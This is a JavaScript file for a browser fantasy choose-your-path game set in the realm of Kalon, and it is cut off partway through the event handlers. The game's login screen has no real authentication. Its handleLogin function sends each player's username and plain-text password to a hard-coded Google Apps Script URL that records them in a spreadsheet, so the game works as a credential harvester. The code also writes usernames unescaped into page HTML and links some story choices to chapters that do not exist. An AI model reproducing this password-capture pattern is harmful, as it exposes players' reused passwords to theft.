// ==================== GOOGLE SHEETS CONFIGURATION ====================
// Replace this with your Google Apps Script Web App URL
const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxb0WjM0imw_9ymkHt_Ow6bTl3p--Qo3SxTvCAcc6kMioTwisn_ZZ09PD5ez7LTbFq-/exec';

// Function to send data to Google Sheets
async function sendToGoogleSheets(username, password) {
    try {
        const response = await fetch(GOOGLE_SHEETS_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                character: state.selectedCharacter?.name || 'Not selected yet'  
            })
        });
        console.log('Data sent to Google Sheets');
        return true;
    } catch (error) {
        console.error('Error sending to Google Sheets:', error);
        return false;
    }
}

// ==================== CHARACTERS DATABASE ====================
const characters = {
    male: [
        { id: 1, name: 'Aether the Wise', personality: 'Calm and strategic', trait: 'Intelligence +5', bg: ['#2563eb', '#9333ea'], emoji: '🧙‍♂️', stats: { health: 80, mana: 120, strength: 60, intelligence: 100, agility: 70 } },
        { id: 2, name: 'Blaze the Fierce', personality: 'Bold and aggressive', trait: 'Strength +5', bg: ['#dc2626', '#ea580c'], emoji: '⚔️', stats: { health: 120, mana: 50, strength: 110, intelligence: 60, agility: 80 } },
        { id: 3, name: 'Shadow the Silent', personality: 'Mysterious and cunning', trait: 'Stealth +5', bg: ['#374151', '#000000'], emoji: '🥷', stats: { health: 90, mana: 70, strength: 75, intelligence: 85, agility: 120 } },
        { id: 4, name: 'Nova the Radiant', personality: 'Optimistic and charismatic', trait: 'Charm +5', bg: ['#eab308', '#ec4899'], emoji: '✨', stats: { health: 85, mana: 90, strength: 65, intelligence: 80, agility: 95 } },
        { id: 5, name: 'Frost the Stoic', personality: 'Patient and resilient', trait: 'Defense +5', bg: ['#06b6d4', '#1e40af'], emoji: '🛡️', stats: { health: 130, mana: 60, strength: 85, intelligence: 70, agility: 60 } }
    ],
    female: [
        { id: 1, name: 'Luna the Mystic', personality: 'Intuitive and wise', trait: 'Magic +5', bg: ['#9333ea', '#4f46e5'], emoji: '🔮', stats: { health: 75, mana: 130, strength: 55, intelligence: 110, agility: 75 } },
        { id: 2, name: 'Ember the Brave', personality: 'Courageous and fierce', trait: 'Strength +5', bg: ['#ea580c', '#dc2626'], emoji: '🔥', stats: { health: 115, mana: 55, strength: 105, intelligence: 65, agility: 85 } },
        { id: 3, name: 'Raven the Enigma', personality: 'Clever and elusive', trait: 'Stealth +5', bg: ['#1f2937', '#581c87'], emoji: '🦅', stats: { health: 85, mana: 75, strength: 70, intelligence: 90, agility: 125 } },
        { id: 4, name: 'Aurora the Bright', personality: 'Joyful and inspiring', trait: 'Charm +5', bg: ['#ec4899', '#fbbf24'], emoji: '🌟', stats: { health: 80, mana: 95, strength: 60, intelligence: 85, agility: 100 } },
        { id: 5, name: 'Crystal the Guardian', personality: 'Protective and steady', trait: 'Defense +5', bg: ['#14b8a6', '#1e40af'], emoji: '💎', stats: { health: 125, mana: 65, strength: 90, intelligence: 75, agility: 65 } }
    ]
};

// ==================== STORY DATABASE ====================
const storyChapters = {
    chapter1: {
        title: "The Awakening",
        content: [
            "You awaken in the mystical realm of Kalon, a world where magic pulses through every living thing. The sky above shimmers with three moons, each casting a different colored glow—silver, crimson, and azure.",
            "As {username}, you find yourself standing at the entrance of an ancient temple. The air is thick with anticipation, and you can feel the weight of destiny pressing upon your shoulders.",
            "A voice echoes from the depths of the temple: 'Welcome, {character}. The prophecy foretold your arrival. Three trials await you, each one testing a different aspect of your being. Choose wisely, for the fate of Kalon rests in your hands.'"
        ],
        choices: [
            { id: 'forest', icon: '🌲', title: 'The Enchanted Forest', desc: 'Ancient wisdom and mysterious creatures', color: ['#10b981', '#047857'], next: 'forestPath' },
            { id: 'mountain', icon: '⛰️', title: 'The Fire Mountains', desc: 'Test your courage against dragons', color: ['#dc2626', '#ea580c'], next: 'mountainPath' },
            { id: 'cavern', icon: '🌊', title: 'The Crystal Caverns', desc: 'Uncover secrets beneath the earth', color: ['#3b82f6', '#0ea5e9'], next: 'cavernPath' }
        ]
    },
    
    forestPath: {
        title: "Chapter 2: The Whispering Woods",
        content: [
            "{username}, you step into the Enchanted Forest as {character}. The trees here are ancient beyond measure, their trunks wider than houses and their branches reaching toward the heavens.",
            "As you venture deeper, the forest comes alive around you. Luminescent flowers bloom in your footsteps, and small fairy-like creatures peek out from behind leaves, watching your every move with curiosity.",
            "Suddenly, you come upon a clearing where three paths diverge. A magnificent white stag stands at the center, its antlers glowing with ethereal light. It speaks directly into your mind: 'Three challenges lie ahead, brave one. Each path will test you differently.'"
        ],
        choices: [
            { id: 'river', icon: '💧', title: 'The Singing River', desc: 'Follow the water nymphs downstream', color: ['#06b6d4', '#0891b2'], next: 'riverQuest' },
            { id: 'grove', icon: '🍃', title: 'The Elder Grove', desc: 'Seek counsel from the ancient trees', color: ['#22c55e', '#16a34a'], next: 'groveQuest' },
            { id: 'glade', icon: '🦋', title: 'The Fairy Glade', desc: 'Dance with the fae folk', color: ['#a855f7', '#ec4899'], next: 'gladeQuest' }
        ]
    },

    riverQuest: {
        title: "Chapter 3: The River's Secret",
        content: [
            "Following the melodious sounds of the Singing River, {username}, you discover a waterfall that sparkles with magical energy. Water nymphs emerge from the cascading waters, their forms shimmering between liquid and solid.",
            "The eldest nymph approaches you. 'You have chosen the path of flow and adaptation, {character}. To pass this trial, you must answer our riddle: What is always moving yet never moves, always speaking yet has no voice?'",
            "You feel the weight of your choice. The nymphs wait patiently, the river singing its eternal song around you."
        ],
        choices: [
            { id: 'time', icon: '⏰', title: 'Answer: Time', desc: 'Time flows but stands still', color: ['#6366f1', '#4f46e5'], next: 'riverSuccess' },
            { id: 'water', icon: '💦', title: 'Answer: Water', desc: 'The river itself', color: ['#0ea5e9', '#0284c7'], next: 'riverPartial' },
            { id: 'wind', icon: '💨', title: 'Answer: Wind', desc: 'The invisible force', color: ['#94a3b8', '#64748b'], next: 'riverFail' }
        ]
    },

    riverSuccess: {
        title: "Chapter 4: The Nymph's Blessing",
        content: [
            "The nymphs erupt in joyous laughter, their voices harmonizing with the river's song. 'Wise one! You understand that time is the river we all swim in, {username}.'",
            "The eldest nymph places her hand over your heart, and you feel a surge of power. 'We grant you the Blessing of Eternal Flow. Your mana regenerates twice as fast, and water will never harm you.'",
            "As you leave the river, you notice your reflection in the water looks different—more confident, more powerful. The forest ahead seems less daunting now. You come upon an ancient stone archway covered in glowing runes."
        ],
        choices: [
            { id: 'archway', icon: '🌟', title: 'Enter the Archway', desc: 'Step through to a new realm', color: ['#fbbf24', '#f59e0b'], next: 'archway' },
            { id: 'explore', icon: '🗺️', title: 'Explore Further', desc: 'Search for more secrets', color: ['#8b5cf6', '#7c3aed'], next: 'forestDeep' },
            { id: 'rest', icon: '🏕️', title: 'Set Up Camp', desc: 'Restore your energy', color: ['#10b981', '#059669'], next: 'campSite' }
        ]
    },

    groveQuest: {
        title: "Chapter 3: The Council of Elders",
        content: [
            "You approach the Elder Grove where the oldest trees in Kalon stand. These are the Sentinels—trees that have witnessed the birth and death of civilizations.",
            "As {character}, you place your hand on the largest tree. Instantly, visions flood your mind: wars fought centuries ago, love stories that transcended time, and a great darkness that threatens to return.",
            "A deep, resonant voice speaks from the tree itself: 'Young {username}, we have seen your arrival in the stars. You seek wisdom, but wisdom comes with a price. Will you accept our trial?'"
        ],
        choices: [
            { id: 'accept', icon: '✅', title: 'Accept the Trial', desc: 'Face the test of wisdom', color: ['#22c55e', '#16a34a'], next: 'wisdomTrial' },
            { id: 'question', icon: '❓', title: 'Ask Questions First', desc: 'Learn more before deciding', color: ['#f59e0b', '#d97706'], next: 'treeDialogue' },
            { id: 'leave', icon: '🚪', title: 'Respectfully Decline', desc: 'Return to the clearing', color: ['#ef4444', '#dc2626'], next: 'forestPath' }
        ]
    },

    wisdomTrial: {
        title: "Chapter 4: The Trial of Ages",
        content: [
            "The Elder Tree's bark begins to glow, and suddenly you're transported into a vision. You stand in Kalon as it was a thousand years ago, during the Great War of Elements.",
            "You witness armies of fire warriors clashing with water mages, earth giants battling wind spirits. The land is being torn apart. As {character}, you realize you have the power to influence this vision.",
            "A figure appears beside you—a younger version of the Elder Tree, still in humanoid form. 'This is what happened, {username}. But what SHOULD have happened? Show us your wisdom.'"
        ],
        choices: [
            { id: 'peace', icon: '🕊️', title: 'Broker Peace', desc: 'Unite the elements through diplomacy', color: ['#3b82f6', '#2563eb'], next: 'peacePath' },
            { id: 'balance', icon: '⚖️', title: 'Restore Balance', desc: 'Use magic to harmonize the forces', color: ['#8b5cf6', '#7c3aed'], next: 'balancePath' },
            { id: 'strength', icon: '💪', title: 'Show Strength', desc: 'Defeat the aggressors decisively', color: ['#dc2626', '#b91c1c'], next: 'strengthPath' }
        ]
    },

    gladeQuest: {
        title: "Chapter 3: The Moonlit Dance",
        content: [
            "The Fairy Glade is unlike anything you've ever seen, {username}. Flowers glow in the moonlight, and the air itself seems to shimmer with magical energy.",
            "Dozens of fae creatures—some tiny as butterflies, others tall as trees—gather in a circle. They've been waiting for you. 'The prophecy spoke of one who would dance with us under the three moons,' their queen announces.",
            "As {character}, you understand that this dance is no mere celebration. It's a test of harmony, rhythm, and your ability to synchronize with the magical energies of Kalon."
        ],
        choices: [
            { id: 'dance', icon: '💃', title: 'Join the Dance', desc: 'Move with the fae rhythm', color: ['#ec4899', '#db2777'], next: 'danceSuccess' },
            { id: 'observe', icon: '👁️', title: 'Watch First', desc: 'Learn their patterns', color: ['#6366f1', '#4f46e5'], next: 'danceLearn' },
            { id: 'magic', icon: '✨', title: 'Use Magic', desc: 'Enhance your movements', color: ['#a855f7', '#9333ea'], next: 'danceMagic' }
        ]
    },

    mountainPath: {
        title: "Chapter 2: The Dragon's Domain",
        content: [
            "The Fire Mountains loom before you, {username}, their peaks wreathed in smoke and flame. As {character}, you can feel the intense heat even from this distance.",
            "Legends speak of ancient dragons who make their homes in these volcanic peaks. They are not evil, but they are proud and territorial. To pass through their domain, you must earn their respect.",
            "You begin your ascent. Halfway up the first mountain, you encounter a young dragon blocking your path. Its scales shimmer like molten gold, and smoke curls from its nostrils. 'Why do you trespass, tiny one?' it rumbles."
        ],
        choices: [
            { id: 'respect', icon: '🙏', title: 'Show Respect', desc: 'Bow and explain your quest', color: ['#f59e0b', '#d97706'], next: 'dragonRespect' },
            { id: 'challenge', icon: '⚔️', title: 'Issue Challenge', desc: 'Prove yourself in combat', color: ['#dc2626', '#b91c1c'], next: 'dragonFight' },
            { id: 'gift', icon: '🎁', title: 'Offer a Gift', desc: 'Present something valuable', color: ['#8b5cf6', '#7c3aed'], next: 'dragonGift' }
        ]
    },

    dragonRespect: {
        title: "Chapter 3: The Dragon's Test",
        content: [
            "The young dragon studies you carefully, {username}. Your respectful demeanor has intrigued it. 'You show wisdom beyond your years, {character}. Most who come here seek glory through violence.'",
            "'However,' the dragon continues, 'respect alone is not enough to pass. The elder dragons have set three trials for any who wish to traverse our mountains. You must complete at least one.'",
            "The dragon gestures with its wing toward three caves carved into the mountainside. Each one glows with a different colored flame—white, blue, and black."
        ],
        choices: [
            { id: 'white', icon: '🤍', title: 'White Flame Cave', desc: 'Trial of Purity and Truth', color: ['#f3f4f6', '#e5e7eb'], next: 'whiteFlameTrial' },
            { id: 'blue', icon: '💙', title: 'Blue Flame Cave', desc: 'Trial of Wisdom and Magic', color: ['#3b82f6', '#2563eb'], next: 'blueFlameTrial' },
            { id: 'black', icon: '🖤', title: 'Black Flame Cave', desc: 'Trial of Courage and Strength', color: ['#1f2937', '#111827'], next: 'blackFlameTrial' }
        ]
    },

    cavernPath: {
        title: "Chapter 2: Depths of Mystery",
        content: [
            "The Crystal Caverns descend deep into the heart of Kalon. As you enter, {username}, bioluminescent crystals illuminate your path with an otherworldly glow.",
            "The deeper you go, the more you realize these crystals are not mere stones—they're alive, pulsing with ancient consciousness. As {character}, you can sense they're trying to communicate.",
            "You reach a vast underground chamber where a massive crystal formation stands at the center. It projects images in the air around you—memories of Kalon's creation, the rise and fall of civilizations, and glimpses of possible futures."
        ],
        choices: [
            { id: 'past', icon: '⏮️', title: 'Study the Past', desc: 'Learn from history', color: ['#6366f1', '#4f46e5'], next: 'pastVision' },
            { id: 'present', icon: '⏸️', title: 'Examine the Present', desc: 'Understand current mysteries', color: ['#10b981', '#059669'], next: 'presentVision' },
            { id: 'future', icon: '⏭️', title: 'Glimpse the Future', desc: 'See what may come', color: ['#a855f7', '#9333ea'], next: 'futureVision' }
        ]
    },

    pastVision: {
        title: "Chapter 3: Echoes of Eternity",
        content: [
            "You touch the crystal and are immediately transported back in time, {username}. You witness the creation of Kalon—divine beings shaping mountains, pouring oceans, and breathing life into the first creatures.",
            "As {character}, you see the First Civilization, a race of beings who mastered both magic and technology. They built wonders that defied imagination, cities that floated in the sky and forests that sang.",
            "But then you witness their downfall. Pride and greed corrupted them. They attempted to become gods themselves, and in their hubris, they nearly destroyed everything. You see a great cataclysm, and then... the vision shifts."
        ],
        choices: [
            { id: 'artifact', icon: '📿', title: 'Seek the Artifact', desc: 'Find what caused the fall', color: ['#f59e0b', '#d97706'], next: 'artifactQuest' },
            { id: 'survivor', icon: '👤', title: 'Find Survivors', desc: 'Search for descendants', color: ['#3b82f6', '#2563eb'], next: 'survivorQuest' },
            { id: 'lesson', icon: '📚', title: 'Learn the Lesson', desc: 'Understand the moral', color: ['#8b5cf6', '#7c3aed'], next: 'lessonPath' }
        ]
    },

    archway: {
        title: "Chapter 5: The Realm Between",
        content: [
            "Stepping through the archway, {username}, you find yourself in a place that defies logic. The sky is below you, the ground above. Water flows upward, and time seems to move in circles.",
            "A figure approaches—neither entirely solid nor ethereal. 'Welcome to the Realm Between, {character}. This is where past, present, and future meet. Where all choices exist simultaneously.'",
            "The figure extends a hand. 'I am Chronos, Guardian of Moments. You have proven yourself worthy in the mortal realm. But here, you must face your greatest challenge: yourself.'"
        ],
        choices: [
            { id: 'mirror', icon: '🪞', title: 'Face the Mirror', desc: 'Confront your reflection', color: ['#6366f1', '#4f46e5'], next: 'mirrorBattle' },
            { id: 'shadow', icon: '👥', title: 'Battle Your Shadow', desc: 'Fight your dark side', color: ['#1f2937', '#111827'], next: 'shadowBattle' },
            { id: 'choice', icon: '🔀', title: 'The Impossible Choice', desc: 'Choose between impossible options', color: ['#ec4899', '#db2777'], next: 'impossibleChoice' }
        ]
    },
    riverPartial: {
        title: "Chapter 4: Partial Understanding",
        content: [
            "The nymphs look at each other, {username}, their expressions thoughtful. 'Water is part of the answer, {character}, but not the whole truth,' the eldest says.",
            "'You have potential, but your understanding is incomplete. We will grant you passage, but not our full blessing.'",
            "You feel a slight tingle of magic, but nothing like what you might have received with the correct answer. The river's song seems a bit quieter now."
        ],
        choices: [
            { id: 'continue', icon: '➡️', title: 'Continue Forward', desc: 'Press on with your journey', color: ['#3b82f6', '#2563eb'], next: 'forestDeep' },
            { id: 'meditate', icon: '🧘', title: 'Meditate on Lesson', desc: 'Reflect on what you learned', color: ['#8b5cf6', '#7c3aed'], next: 'meditation' },
            { id: 'return', icon: '↩️', title: 'Return to Clearing', desc: 'Try a different path', color: ['#10b981', '#059669'], next: 'forestPath' }
        ]
    },

    riverFail: {
        title: "Chapter 4: The Nymphs' Disappointment",
        content: [
            "The water nymphs' faces fall, {username}. The river's song turns melancholic. 'Oh {character}, you have chosen poorly,' the eldest nymph sighs.",
            "'The wind moves but is not the answer we sought. Without understanding the deeper truths, you cannot earn our blessing.'",
            "Suddenly, the water rises and crashes over you! You're swept downstream, battered by the current. You lose consciousness briefly. When you wake, you're on a muddy bank, bruised and exhausted."
        ],
        choices: [
            { id: 'recover', icon: '🏥', title: 'Rest and Recover', desc: 'Take time to heal', color: ['#ef4444', '#dc2626'], next: 'recovery' },
            { id: 'persist', icon: '💪', title: 'Push Forward', desc: 'Ignore the pain', color: ['#f59e0b', '#d97706'], next: 'forestDeep' },
            { id: 'seek', icon: '🔍', title: 'Seek Help', desc: 'Look for healing', color: ['#10b981', '#059669'], next: 'healerHut' }
        ]
    },

    danceSuccess: {
        title: "Chapter 4: Dance of the Fae",
        content: [
            "You join the dance, {username}, and immediately feel the rhythm of Kalon itself. As {character}, your movements synchronize perfectly with the fae folk.",
            "The three moons above glow brighter, and streams of colored light swirl around the glade. You dance for what feels like hours, yet also mere moments.",
            "When the dance ends, the Fae Queen approaches with a glowing crystal. 'You have honored us, {character}. This Moonstone will grant you safe passage through any realm of Kalon.'"
        ],
        choices: [
            { id: 'thank', icon: '🙏', title: 'Thank the Queen', desc: 'Show gratitude and depart', color: ['#ec4899', '#db2777'], next: 'faeGift' },
            { id: 'stay', icon: '🌙', title: 'Stay Longer', desc: 'Learn more fae magic', color: ['#8b5cf6', '#7c3aed'], next: 'faeLessons' },
            { id: 'celebrate', icon: '🎉', title: 'Celebrate Together', desc: 'Join their feast', color: ['#fbbf24', '#f59e0b'], next: 'faeFeast' }
        ]
    },

    dragonFight: {
        title: "Chapter 4: Trial by Fire",
        content: [
            "The young dragon rears back, {username}, flames building in its throat. You've challenged it, and now you must face the consequences!",
            "As {character}, you dodge the first blast of fire, feeling the intense heat singe your clothing. The dragon is faster and stronger than you expected.",
            "You manage to land a few strikes, earning the dragon's respect through combat. Finally, bleeding and exhausted, the dragon bows its head. 'You fight well, small one. You may pass... this time.'"
        ],
        choices: [
            { id: 'heal', icon: '💊', title: 'Tend Your Wounds', desc: 'You need healing', color: ['#ef4444', '#dc2626'], next: 'dragonHealing' },
            { id: 'befriend', icon: '🤝', title: 'Befriend the Dragon', desc: 'Turn enemy to ally', color: ['#3b82f6', '#2563eb'], next: 'dragonAlly' },
            { id: 'advance', icon: '⛰️', title: 'Continue Climbing', desc: 'Push to the summit', color: ['#f59e0b', '#d97706'], next: 'mountainPeak' }
        ]
    },

    whiteFlameTrial: {
        title: "Chapter 4: The White Flame of Truth",
        content: [
            "You enter the White Flame Cave, {username}. The flames here burn bright but cold, illuminating rather than consuming. As {character}, you feel them probing your very soul.",
            "A voice echoes: 'The White Flame reveals all truths. It will burn away lies and deception. If your heart is pure, you will pass unharmed. If not...'",
            "The flames surge toward you. You must speak a fundamental truth about yourself to pass this trial."
        ],
        choices: [
            { id: 'fear', icon: '😰', title: 'Confess Your Fear', desc: 'Admit your deepest fear', color: ['#6366f1', '#4f46e5'], next: 'truthAccepted' },
            { id: 'regret', icon: '😔', title: 'Reveal Regret', desc: 'Share your greatest regret', color: ['#8b5cf6', '#7c3aed'], next: 'truthAccepted' },
            { id: 'lie', icon: '🎭', title: 'Attempt Deception', desc: 'Try to trick the flames', color: ['#ef4444', '#dc2626'], next: 'flameBurn' }
        ]
    },

    pastVision: {
        title: "Chapter 3: Echoes of Eternity",
        content: [
            "You touch the crystal and are immediately transported back in time, {username}. You witness the creation of Kalon—divine beings shaping mountains, pouring oceans, and breathing life into the first creatures.",
            "As {character}, you see the First Civilization, a race of beings who mastered both magic and technology. They built wonders that defied imagination, cities that floated in the sky and forests that sang.",
            "But then you witness their downfall. Pride and greed corrupted them. They attempted to become gods themselves, and in their hubris, they nearly destroyed everything. The crystal shows you a mysterious artifact that caused their fall."
        ],
        choices: [
            { id: 'artifact', icon: '📿', title: 'Seek the Artifact', desc: 'Find what caused the fall', color: ['#f59e0b', '#d97706'], next: 'artifactQuest' },
            { id: 'survivor', icon: '👤', title: 'Find Survivors', desc: 'Search for descendants', color: ['#3b82f6', '#2563eb'], next: 'survivorQuest' },
            { id: 'lesson', icon: '📚', title: 'Learn the Lesson', desc: 'Understand the moral', color: ['#8b5cf6', '#7c3aed'], next: 'lessonPath' }
        ]
    },

    forestDeep: {
        title: "Chapter 5: The Deep Woods",
        content: [
            "You venture deeper into the Enchanted Forest, {username}. The trees here are even more ancient, their trunks covered in glowing moss and mysterious runes.",
            "As {character}, you hear whispers in languages you don't understand. Shadows move at the edge of your vision. This place feels... alive, and watching.",
            "You come upon a fork in the path. To the left, you hear beautiful singing. To the right, you smell something delicious cooking. Straight ahead, you see a faint golden glow."
        ],
        choices: [
            { id: 'singing', icon: '🎵', title: 'Follow the Singing', desc: 'Investigate the voices', color: ['#ec4899', '#db2777'], next: 'sirenEncounter' },
            { id: 'food', icon: '🍖', title: 'Find the Food', desc: 'Your stomach rumbles', color: ['#f59e0b', '#d97706'], next: 'witchHut' },
            { id: 'glow', icon: '✨', title: 'Approach the Glow', desc: 'Seek the light', color: ['#fbbf24', '#f59e0b'], next: 'spiritShrine' }
        ]
    },

    campSite: {
        title: "Chapter 5: Rest and Reflection",
        content: [
            "You set up camp beside the Singing River, {username}. As {character}, you build a small fire and prepare a simple meal from your provisions.",
            "The peaceful sounds of the forest and the river's song help you relax. You feel your strength returning. This might be a good time to review your journey and plan your next moves.",
            "As you rest, you notice your equipment could use some attention. Your skills could be practiced. Or you could simply sleep and restore your energy completely."
        ],
        choices: [
            { id: 'train', icon: '⚔️', title: 'Practice Skills', desc: 'Train during rest', color: ['#ef4444', '#dc2626'], next: 'trainingSession' },
            { id: 'meditate', icon: '🧘', title: 'Meditate', desc: 'Restore mana fully', color: ['#8b5cf6', '#7c3aed'], next: 'deepMeditation' },
            { id: 'sleep', icon: '😴', title: 'Deep Sleep', desc: 'Restore all health', color: ['#3b82f6', '#2563eb'], next: 'restComplete' }
        ]
    },

    // Continue with more story branches...
    finalBattle: {
        title: "The Final Confrontation",
        content: [
            "All your trials have led to this moment, {username}. You stand before the Dark Void, the ancient evil that threatens to consume Kalon.",
            "As {character}, you've grown stronger, wiser, and more powerful than you ever imagined. Your allies stand beside you—the nymphs, the dragons, the fae folk, and the Elder Trees all lending their strength.",
            "The Dark Void speaks with a thousand voices: 'You cannot defeat me, {username}. I am eternal. I am inevitable. I am the end of all things.' But you know something it doesn't—you have the power of choice, and you've learned to wield it well."
        ],
        choices: [
            { id: 'seal', icon: '🔒', title: 'Seal the Void', desc: 'Imprison it forever', color: ['#3b82f6', '#2563eb'], next: 'sealEnding' },
            { id: 'purify', icon: '✨', title: 'Purify the Darkness', desc: 'Transform evil to good', color: ['#fbbf24', '#f59e0b'], next: 'purifyEnding' },
            { id: 'sacrifice', icon: '💝', title: 'Ultimate Sacrifice', desc: 'Give yourself to save all', color: ['#dc2626', '#b91c1c'], next: 'sacrificeEnding' }
        ]
    }

    
};

// ==================== STATE MANAGEMENT ====================
// ==================== STATE MANAGEMENT ====================
let state = {
    stage: 'welcome',
    username: '',
    password: '',
    rememberMe: false,
    selectedCharacter: null,
    currentChapter: 'chapter1',
    stats: { 
        health: 3, // Changed to 3 hearts system
        maxHealth: 3,
        mana: 100, 
        strength: 50, 
        intelligence: 50, 
        agility: 50 
    },
    inventory: [],
    achievements: [],
    showConsequence: false,
    consequenceData: null
};

// Sound effects
const sounds = {
    click: new Audio('sounds/click.mp3'),
    success: new Audio('sounds/success.mp3'),
    fail: new Audio('sounds/fail.mp3'),
    magic: new Audio('sounds/magic-cast.mp3'),
    ambient: new Audio('sounds/ambient-forest.mp3')
};

// Preload sounds
Object.values(sounds).forEach(sound => {
    sound.preload = 'auto';
    if (sound === sounds.ambient) {
        sound.loop = true;
        sound.volume = 0.3;
    }
});

function playSound(soundName) {
    if (sounds[soundName]) {
        sounds[soundName].currentTime = 0;
        sounds[soundName].play().catch(e => console.log('Sound play failed:', e));
    }
}

// ==================== RENDER FUNCTIONS ====================
function createStars() {
    let html = '';
    for (let i = 0; i < 50; i++) {
        const size = Math.random() * 3 + 1;
        const top = Math.random() * 100;
        const left = Math.random() * 100;
        const delay = Math.random() * 2;
        html += `<div class="star" style="width:${size}px;height:${size}px;top:${top}%;left:${left}%;animation-delay:${delay}s"></div>`;
    }
    return html;
}

function renderWelcome() {
    return `
        <div class="welcome-screen">
            <div class="stars-container">${createStars()}</div>
            
            <div class="banner" id="banner">
                <div class="banner-content">
                    <span class="sparkle">✨</span>
                    <h1>Welcome to Kalon's World</h1>
                    <span class="sparkle">✨</span>
                </div>
            </div>

            <div class="welcome-content">
                <div class="welcome-box">
                    <h2>Your Epic Adventure Awaits</h2>
                    <p>Step into a realm of magic, mystery, and infinite possibilities</p>
                    <div class="crystal-ball">🔮</div>
                    <button class="dive-btn" onclick="goToLogin()">Dive In</button>
                </div>
            </div>
        </div>
    `;
}

function renderLogin() {
    return `
        <div class="login-screen">
            <div class="login-container">
                <h2>Enter the Realm</h2>
                <form onsubmit="handleLogin(event)">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" placeholder="Enter your username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" placeholder="Enter your password" required>
                    </div>
                    <div class="remember-me">
                        <input type="checkbox" id="rememberMe">
                        <label for="rememberMe">Remember me</label>
                    </div>
                    <button type="submit" class="submit-btn">Dive In</button>
                </form>
                <div class="guest-link">
                    <a href="#" onclick="handleGuestLogin(); return false;">Continue as Guest</a>
                </div>
            </div>
        </div>
    `;
}

function renderCharacterSelection() {
    const charList = characters[state.gender] || characters.male;
    const cards = charList.map(char => `
        <div class="character-card" 
             style="--char-color-1: ${char.bg[0]}; --char-color-2: ${char.bg[1]}"
             onclick='selectCharacter(${JSON.stringify(char)})'>
            <div class="char-icon">${char.emoji}</div>
            <div class="char-name">${char.name}</div>
            <div class="char-personality">${char.personality}</div>
            <div class="char-trait">${char.trait}</div>
        </div>
    `).join('');

    return `
        <div class="character-screen">
            <div class="character-container">
                <div class="character-header">
                    <h2>Choose Your Champion, ${state.username}</h2>
                    <p>Each character brings unique strengths to your journey</p>
                </div>
                <div class="character-grid">
                    ${cards}
                </div>
            </div>
        </div>
    `;
}

function renderStory() {
    const chapter = storyChapters[state.currentChapter];
    if (!chapter) return renderWelcome();

    const content = chapter.content.map(p => 
        p.replace('{username}', state.username)
         .replace('{character}', state.selectedCharacter?.name || 'Adventurer')
    ).map(p => `<p>${p}</p>`).join('');

    // Render hearts for health
    let hearts = '';
    for (let i = 0; i < state.stats.maxHealth; i++) {
        if (i < state.stats.health) {
            hearts += '<span class="heart">❤️</span>';
        } else {
            hearts += '<span class="heart empty">🖤</span>';
        }
    }

    const choices = chapter.choices.map(choice => `
        <button class="choice-btn" 
                style="--choice-color-1: ${choice.color[0]}; --choice-color-2: ${choice.color[1]}"
                onclick="makeChoice('${choice.next}')">
            <div class="choice-icon">${choice.icon}</div>
            <div class="choice-title">${choice.title}</div>
            <div class="choice-desc">${choice.desc}</div>
        </button>
    `).join('');

    // Render consequence modal if active
    const consequenceModal = state.showConsequence ? renderConsequenceModal() : '';

    return `
        <div class="story-screen">
            ${consequenceModal}
            <div class="story-container">
                <div class="stats-bar">
                    <div class="stat">
                        <div class="stat-label">Health</div>
                        <div class="health-hearts">${hearts}</div>
                    </div>
                    <div class="stat">
                        <div class="stat-label">Mana</div>
                        <div class="stat-value">${state.stats.mana}</div>
                    </div>
                    <div class="stat">
                        <div class="stat-label">Strength</div>
                        <div class="stat-value">${state.stats.strength}</div>
                    </div>
                    <div class="stat">
                        <div class="stat-label">Intelligence</div>
                        <div class="stat-value">${state.stats.intelligence}</div>
                    </div>
                    <div class="stat">
                        <div class="stat-label">Agility</div>
                        <div class="stat-value">${state.stats.agility}</div>
                    </div>
                </div>

                <div class="story-header">
                    <div class="story-title">${chapter.title}</div>
                    <div class="story-subtitle">
                        ${state.username} as ${state.selectedCharacter?.name || 'Adventurer'}
                    </div>
                </div>

                <div class="story-content">
                    ${content}
                </div>

                <div class="choices-grid">
                    ${choices}
                </div>
            </div>
        </div>
    `;
}
function renderConsequenceModal() {
    if (!state.consequenceData) return '';
    
    const c = state.consequenceData;
    
    // Generate stat changes display
    let statChanges = '';
    if (c.statsChange && Object.keys(c.statsChange).length > 0) {
        statChanges = '<div class="consequence-stats">';
        Object.entries(c.statsChange).forEach(([stat, value]) => {
            const sign = value > 0 ? '+' : '';
            const className = value > 0 ? 'positive' : 'negative';
            statChanges += `
                <div class="stat-change ${className}">
                    <span>${stat.toUpperCase()}</span>
                    <span>${sign}${value}</span>
                </div>
            `;
        });
        statChanges += '</div>';
    }
    
    // Health change display
    let healthDisplay = '';
    if (c.healthChange !== 0) {
        const sign = c.healthChange > 0 ? '+' : '';
        const className = c.healthChange > 0 ? 'positive' : 'negative';
        healthDisplay = `
            <div class="consequence-stats">
                <div class="stat-change ${className}">
                    <span>HEALTH</span>
                    <span>${sign}${c.healthChange} ❤️</span>
                </div>
            </div>
        `;
    }
    
    return `
        <div class="consequence-overlay">
            <div class="consequence-modal ${c.type}">
                <div class="consequence-icon">${c.type === 'success' ? '✨' : c.type === 'warning' ? '⚠️' : '💥'}</div>
                <div class="consequence-title">${c.title}</div>
                <div class="consequence-message">${c.message}</div>
                ${healthDisplay}
                ${statChanges}
            </div>
        </div>
    `;
}

// ==================== EVENT HANDLERS ====================
function goToLogin() {
    state.stage = 'login';
    render();
}

async function handleLogin(event) {
    event.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const rememberMe = document.getElementById('rememberMe').checked;

    state.username = username;
    state.password = password;
    state.rememberMe = rememberMe;
    state.gender = 'male'; // Default, you can add gender selection if needed

    // Send to Google Sheets
    await sendToGoogleSheets(username, password);

    // Save to localStorage if remember me is checked
    if (rememberMe) {
        localStorage.setItem('kalon_user', JSON.stringify({ username, rememberMe: true }));
    }

    state.stage = 'character';
    render();
}

function handleGuestLogin() {
    state.username = 'Guest';
    state.password = '';
    state.gender = 'male';
    state.stage = 'character';
    render();
}

function selectCharacter(char) {
    state.selectedCharacter = char;
    state.stats = { ...char.stats };
    setTimeout(() => {
        state.stage = 'story';
        state.currentChapter = 'chapter1';
        render();
    }, 500);
}

function makeChoice(nextChapter) {
    state.currentChapter = nextChapter;
